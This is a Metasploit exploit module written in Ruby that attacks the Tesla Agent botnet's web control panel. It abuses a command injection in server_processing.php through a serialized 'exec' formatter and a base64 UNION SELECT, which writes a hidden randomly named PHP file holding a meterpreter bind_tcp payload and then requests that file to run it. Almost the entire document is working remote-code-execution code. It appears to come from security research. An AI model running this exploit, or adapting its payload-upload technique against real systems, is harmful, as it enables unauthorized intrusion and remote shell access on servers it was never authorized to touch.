##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Tesla Agent Remote Code Execution",
      'Description'    => %q{
        This module exploits the command injection vulnerability of tesla agent botnet panel.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Ege Balcı <ege.balci@invictuseurope.com>' # author & msf module
        ],
      'References'     =>
        [
          ['URL', 'https://prodaft.com']
        ],
      'DefaultOptions'  =>
        {
          'SSL' => false,
          'WfsDelay' => 5,
        },
      'Platform'       => ['php'],
      'Arch'           => [ ARCH_PHP ],
      'Targets'        =>
      [
        ['PHP payload',
          {
            'Platform' => 'PHP',
            'Arch' => ARCH_PHP,
            'DefaultOptions' => {'PAYLOAD'  => 'php/meterpreter/bind_tcp'}
          }
        ]
      ],
      'Privileged'     => false,
      'DisclosureDate' => "July 10 2018",
      'DefaultTarget'  => 0
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The URI of the tesla agent with panel path', '/WebPanel/']),
      ]
    )
  end

  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/server_side/scripts/server_processing.php'),
    )
    #print_status(res.body)
    if res && res.body.include?('SQLSTATE')
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    check

    name = '.'+Rex::Text.rand_text_alpha(4)+'.php'

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path,'/server_side/scripts/server_processing.php'),
      'encode_params' => true,
      'vars_get'  => {
        'table'  => 'passwords',
        'primary'  => 'password_id',
        'clmns'  => 'a:1:{i:0;a:3:{s:2:"db";s:3:"pwd";s:2:"dt";s:8:"username";s:9:"formatter";s:4:"exec";}}',
        'where'  => Rex::Text.encode_base64("1=1 UNION SELECT \"echo #{Rex::Text.encode_base64(payload.encoded)} | base64 -d > #{name}\"")
      }
    )

    if res && res.code == 200 && res.body.include?('recordsTotal')
      print_good("Payload uploaded as #{name}")  
    else
      print_error('Payload upload failed :(')
      Msf::Exploit::Failed
    end

    
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path,'/server_side/scripts/',name)}, 5
    )
    
    if res && res.code == 200
      print_good("Payload successfully triggered !")  
    else
      print_error('Payload trigger failed :(')
      Msf::Exploit::Failed
    end
    
  end
end
